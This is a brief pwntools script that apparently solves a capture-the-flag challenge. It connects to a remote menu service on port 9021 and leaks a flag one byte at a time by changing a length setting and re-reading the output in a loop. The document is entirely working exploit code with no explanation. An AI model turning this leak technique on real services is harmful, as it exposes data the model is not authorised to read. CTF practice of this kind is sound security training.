from pwn import *
p = remote(HOST, 9021)

def init():
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'continue?\n', b'y')
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', b'56')

def read_flag():
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'continue?\n', b' ')

def snake_length(n):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(n).encode())

init()
flag = "C"
for i in range(1,56):
    while True:
        snake_length(i)
        read_flag()
        p.recvn(10)
        leak = p.recvline()
        try:
            flag += chr(leak[i])
            break
        except:
            pass

print(flag)
p.interactive()
